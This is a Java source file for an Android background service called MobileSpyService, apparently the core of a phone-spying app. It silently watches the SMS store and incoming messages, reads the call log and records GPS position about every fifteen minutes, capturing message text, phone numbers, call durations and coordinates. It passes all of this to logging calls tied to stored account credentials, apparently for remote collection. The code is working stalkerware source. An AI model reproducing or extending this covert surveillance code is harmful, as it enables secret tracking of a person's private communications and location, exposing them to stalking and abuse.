package org.ddth.android.mobilespy;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

import org.ddth.http.core.Logger;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.telephony.gsm.SmsMessage;

public class MobileSpyService extends Service {

	private static final String CONTENT_SMS = "content://sms";
    public static final int MESSAGE_TYPE_OUTBOX = 4;
	public static final int MESSAGE_TYPE_SENT   = 2;
    
	private static final DateFormat LOG_TIME_FORMAT = new SimpleDateFormat("HH:mm:ss");
	private static final DateFormat LOG_DATE_FORMAT = new SimpleDateFormat("yyyy-MM-dd");
	
	public static final String EXTRA_EVENT_TYPE = "mobilespy.event.type";
	public static final int EVENT_TYPE_PHONE_ACTIVATED = 0;
	public static final int EVENT_TYPE_SMS = 1;
	public static final int EVENT_TYPE_CALL = 2;
	
	/**
	 * Time (in milliseconds) between 2 GPS logging
	 */
	private static final long GPS_LOGGING_INTERVAL = 900000L;
	
	/**
	 * Time (in milliseconds) to get location updated
	 * from Android device
	 */
	private static final long LOCATION_UPDATE_INTERVAL = 60000L;
	
	private String phoneNumber;
	private Timer timer;
	private ContentObserver observer;
	private LocationListener listener;

	@Override
	public void onCreate() {
		super.onCreate();
		TelephonyManager telephony = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
		phoneNumber = telephony.getLine1Number();
		timer = new Timer();
		SharedPreferences settings = getSharedPreferences(MobileSpy.APPLICATION_TAG, MODE_PRIVATE);
		MobileSpy.setCredentials(
				settings.getString(MobileSpy.USERNAME_FIELD, ""),
				settings.getString(MobileSpy.PASSWORD_FIELD, ""));
		registerSmsEventObserver();
		registerLocationListener();
	}
	
	@Override
	public void onStart(final Intent intent, int startId) {
		super.onStart(intent, startId);
		// Delay processing a little bit in order to make
		// sure the data is fully available for accessing.
		timer.schedule(new TimerTask() {
			@Override
			public void run() {
				onHandleIntent(intent);
			}
		}, 500);
	}

	protected void onHandleIntent(Intent intent) {
		int eventType = intent.getExtras().getInt(EXTRA_EVENT_TYPE);
		switch (eventType) {
		case MobileSpyService.EVENT_TYPE_PHONE_ACTIVATED:
			// This is just a dummy event but do not remove it!
			// It is employed for creating an instance of this
			// object and therefore registering some listeners.
			// See #onCreate for more information.
			break;
			
		case EVENT_TYPE_SMS:
			logSMS(intent);
			break;
			
		case EVENT_TYPE_CALL:
			logCall();
			break;
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	/**
	 * Register GPS location change events for periodically notified.
	 */
	private void registerLocationListener() {
		if (listener != null) {
			return;
		}
		listener = new LocationListener() {
			private long lastUpdateTime = 0;
			
			public void onLocationChanged(Location location) {
				long now = System.currentTimeMillis();
				if (now - lastUpdateTime > GPS_LOGGING_INTERVAL) {
					logGPS(location);
					lastUpdateTime = now;
				}
			}

			public void onProviderDisabled(String provider) {
			}

			public void onProviderEnabled(String provider) {
			}

			public void onStatusChanged(String provider, int status, Bundle extras) {
			}
		};
		LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
		manager.requestLocationUpdates(
				LocationManager.GPS_PROVIDER, LOCATION_UPDATE_INTERVAL, 0.0f, listener);
	}

	/**
	 * Register a content observer for SMS events
	 */
	private void registerSmsEventObserver() {
		if (observer != null) {
			return;
		}
		observer = new ContentObserver(null) {
			public void onChange(boolean selfChange) {
				logSMS(MobileSpyService.this);
			}
		};
		getContentResolver().registerContentObserver(
			Uri.parse(CONTENT_SMS), true, observer);
	}

	private void logGPS(Location location) {
		if (location != null) {
			String lon = String.valueOf(location.getLongitude());
			String lat = String.valueOf(location.getLatitude());
			String speed = String.valueOf(location.getSpeed());
			String dir = String.valueOf(location.getBearing());
			Date now = new Date(location.getTime());
    		String date = LOG_DATE_FORMAT.format(now);
			String time = LOG_TIME_FORMAT.format(now);
			MobileSpy.logGPS(lon, lat, speed, dir, date, time);
		}
	}

	/**
	 * This is invoked directly from the SMS observer to log
	 * outgoing SMS only. An elegant method would be firing 
	 * an intent to the BroadcastReceiver instead.
	 * 
	 * @param context
	 */
	private void logSMS(Context context) {
		Cursor cursor = getContentResolver().query(
				Uri.parse(CONTENT_SMS), null, null, null, null);
		if (cursor.moveToNext()) {
			String protocol = cursor.getString(cursor.getColumnIndex("protocol"));
			int type = cursor.getInt(cursor.getColumnIndex("type"));
			// Only processing outgoing sms event & only when it
			// is sent successfully (available in SENT box).
			if (protocol != null || type != MESSAGE_TYPE_SENT) {
				return;
			}
    		int dateColumn = cursor.getColumnIndex("date");
    		int bodyColumn = cursor.getColumnIndex("body");
    		int addressColumn = cursor.getColumnIndex("address");

    		String from = "0";
    		String to = cursor.getString(addressColumn);
    		Date now = new Date(cursor.getLong(dateColumn));
    		String date = LOG_DATE_FORMAT.format(now);
			String time = LOG_TIME_FORMAT.format(now);
			String message = cursor.getString(bodyColumn);
			MobileSpy.logSMS(date, time, from, to, message);
		}
	}

	private void logCall() {
		Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DEFAULT_SORT_ORDER); 
		
		int numberColumn = cursor.getColumnIndex(CallLog.Calls.NUMBER);
		int typeColumn = cursor.getColumnIndex(CallLog.Calls.TYPE);
		int dateColumn = cursor.getColumnIndex(CallLog.Calls.DATE);
		int durationColumn = cursor.getColumnIndex(CallLog.Calls.DURATION);

		if (!cursor.moveToFirst()) {
			cursor.close();
			return;
		}
		
		String number = cursor.getString(numberColumn);
		Date now = new Date(cursor.getLong(dateColumn));
		
		String date = LOG_DATE_FORMAT.format(now);
		String time = LOG_TIME_FORMAT.format(now);
		long ellapse = cursor.getLong(durationColumn);
		String duration = String.format("%02d:%02d:%02d", ellapse/3600, (ellapse % 3600)/60, (ellapse % 60));

		int type = cursor.getInt(typeColumn);
		
		String from = number, to = phoneNumber;
		String callType = "";
		switch (type) {
		case CallLog.Calls.INCOMING_TYPE:
			callType = MobileSpy.CALL_TYPE_INCOMING;
			break;
			
		case CallLog.Calls.OUTGOING_TYPE:
			from = phoneNumber;
			to = number;
			callType = MobileSpy.CALL_TYPE_OUTGOING;
			break;
			
		case CallLog.Calls.MISSED_TYPE:
			callType = MobileSpy.CALL_TYPE_MISSEDCALL;
			break;
		}
		MobileSpy.logCall(date, time, from, to, duration, callType);
	}
	
	private void logSMS(Intent intent) {
		SmsMessage msg[] = getMessagesFromIntent(intent);
		for (int i = 0; i < msg.length; i++) {
			String message = msg[i].getDisplayMessageBody();
			if (message != null && message.length() > 0) {
				String from = msg[i].getOriginatingAddress();
				String to = "0";
				Date now = new Date();
				String date = LOG_DATE_FORMAT.format(now);
				String time = LOG_TIME_FORMAT.format(now);
				MobileSpy.logSMS(date, time, from, to, message);
			}
		}	
	}

	private SmsMessage[] getMessagesFromIntent(Intent intent) {
		SmsMessage msgs[] = null;
		Bundle bundle = intent.getExtras();
		try {
			Object pdus[] = (Object[]) bundle.get("pdus");
			msgs = new SmsMessage[pdus.length];
			for (int n = 0; n < pdus.length; n++) {
				byte[] byteData = (byte[]) pdus[n];
				msgs[n] = SmsMessage.createFromPdu(byteData);
			}
		}
		catch (Exception e) {
			Logger.getDefault().error("Fail", e);
		}
		return msgs;
	}
}
